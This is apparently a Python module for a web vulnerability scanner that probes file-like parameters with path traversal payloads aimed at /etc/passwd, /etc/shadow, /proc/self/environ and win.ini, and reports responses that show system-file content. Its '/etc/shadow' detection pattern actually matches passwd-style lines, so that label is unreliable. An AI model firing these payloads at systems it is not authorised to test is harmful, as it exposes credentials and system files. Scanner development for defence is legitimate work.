"""
Path Traversal scanner module.

Detects directory traversal vulnerabilities that allow attackers
to access files outside the web root directory.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional

import requests


# Path traversal payloads for different OS
PATH_PAYLOADS = [
    # Linux/Unix
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    
    # Null byte bypass (older systems)
    "../../../etc/passwd%00",
    
    # Absolute paths
    "/etc/passwd",
    "C:\\windows\\win.ini",
    
    # Common files to test
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../proc/self/environ",
]


class PathTraversalScanner:
    """Scanner for path traversal vulnerabilities."""

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        # Use provided session (authenticated) or create new one
        if session:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test GET parameters for path traversal."""
        findings: List[Dict[str, Any]] = []

        for param_name in params.keys():
            # Only test params that look like file/path parameters
            if self._looks_like_file_param(param_name):
                print(f"Testing {param_name} for path traversal...")
                original_value = str(params.get(param_name, ""))
                
                for payload in PATH_PAYLOADS:
                    vuln = self._test_path_traversal(url, param_name, original_value, params, payload)
                    if vuln:
                        findings.append(vuln)
                        break

        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs for path traversal."""
        findings: List[Dict[str, Any]] = []

        action = form_data.get("action")
        method = (form_data.get("method") or "GET").upper()
        inputs = form_data.get("inputs", [])

        if not action or not inputs:
            return findings

        baseline = {inp.get("name", ""): "" for inp in inputs if inp.get("name")}

        for param_name in baseline.keys():
            if self._looks_like_file_param(param_name):
                print(f"Testing form param {param_name} for path traversal...")
                original_value = baseline.get(param_name, "")
                
                for payload in PATH_PAYLOADS:
                    vuln = self._test_path_traversal(action, param_name, original_value, baseline, payload, method=method)
                    if vuln:
                        findings.append(vuln)
                        break

        return findings

    def _looks_like_file_param(self, param_name: str) -> bool:
        """Check if parameter name suggests it handles files/paths."""
        file_keywords = ['file', 'path', 'dir', 'folder', 'document', 'doc', 'page', 'include', 'template', 'view']
        param_lower = param_name.lower()
        return any(keyword in param_lower for keyword in file_keywords)

    def _test_path_traversal(
        self,
        test_url: str,
        param_name: str,
        original_value: str,
        params: Dict[str, Any],
        payload: str,
        method: str = "GET",
    ) -> Optional[Dict[str, Any]]:
        """Test a single path traversal payload."""
        try:
            injected = payload  # Replace value entirely for path traversal
            data = params.copy()
            data[param_name] = injected

            if method.upper() == "GET":
                resp = self.session.get(test_url, params=data, timeout=self.timeout)
            else:
                resp = self.session.post(test_url, data=data, timeout=self.timeout)

            text = resp.text or ""
            
            # Check for sensitive file content patterns
            patterns = [
                (r"root:.*:/bin/(ba)?sh", "/etc/passwd file content"),
                (r"\[extensions\]|for 16-bit app support", "win.ini file content"),
                (r"127\.0\.0\.1\s+localhost", "/etc/hosts file content"),
                (r"nobody:.*:99:99", "/etc/shadow file content"),
            ]
            
            for pattern, description in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    print(f"Path traversal detected on {param_name} - {description}")
                    return {
                        "vulnerable": True,
                        "type": "path-traversal",
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Detected {description}",
                        "confidence": 95,
                    }

        except requests.RequestException as exc:
            print(f"Request failed during path traversal test for {param_name}: {exc}")

        return None